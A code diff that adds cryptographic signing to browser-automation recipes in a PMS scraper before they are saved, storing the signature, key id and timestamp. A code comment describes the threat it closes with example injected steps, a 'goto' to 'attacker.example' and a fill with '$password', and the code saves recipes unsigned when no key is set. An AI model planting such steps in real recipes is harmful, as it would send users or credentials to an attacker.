@@ -35,6 +35,7 @@ import { log } from './log.js';
 import { mapPMS, type MapperResult } from './mapper.js';
 import { safeGoto, UnsafeNavigationError } from './browser-utils/navigate.js';
 import { env } from './env.js';
+import { signRecipe, isRecipeSigningConfigured } from './recipe-signing.js';
 import type { PMSCredentials, PMSType, Recipe, ScraperCredentialsRow } from './types.js';
 
 export interface MappingJobInput {
@@ -417,6 +418,35 @@ async function saveDraftKnowledgeFile(
     hints: recipe.hints ?? {},
   };
 
+  // Plan v8 P1-7 — sign the recipe before persisting. Closes the takeover-
+  // mode recipe-injection vector: when admin drives the browser in Live
+  // Mapping, admin-recorded click_at / type_text steps land in this same
+  // insert. A compromised or socially-engineered admin could otherwise
+  // inject {kind: 'goto', url: 'attacker.example'} or {kind: 'fill',
+  // selector: ..., value: '$password'}. Signing ties the recipe to the
+  // active key; replay-time verifyRecipe refuses tampered rows under
+  // RECIPE_SIGNING_ENFORCE=enforce. When no key is configured (legacy
+  // dev), we log + skip — recipe-runner runs in warn mode and proceeds.
+  let signatureBytes: Buffer | null = null;
+  let signedWithKeyId: string | null = null;
+  let signedAt: string | null = null;
+  if (isRecipeSigningConfigured()) {
+    try {
+      const sig = signRecipe(recipe);
+      signatureBytes = sig.signature;
+      signedWithKeyId = sig.signedWithKeyId;
+      signedAt = sig.signedAt;
+    } catch (err) {
+      log.warn('saveDraftKnowledgeFile: signRecipe failed — saving unsigned', {
+        err: (err as Error).message, pmsFamily, version: nextVersion,
+      });
+    }
+  } else {
+    log.info('saveDraftKnowledgeFile: signing key not configured — saving unsigned', {
+      pmsFamily, version: nextVersion,
+    });
+  }
+
   const { data: inserted, error: insErr } = await supabase
     .from('pms_knowledge_files')
     .insert({
@@ -426,6 +456,9 @@ async function saveDraftKnowledgeFile(
       knowledge,
       created_by: 'mapper:mapping-driver',
       notes: `Mapped at ${new Date().toISOString()}. Targets: ${Object.keys(recipe.actions).join(', ')}.`,
+      signature: signatureBytes,
+      signed_with_key_id: signedWithKeyId,
+      signed_at: signedAt,
     })
     .select('id')
     .single();
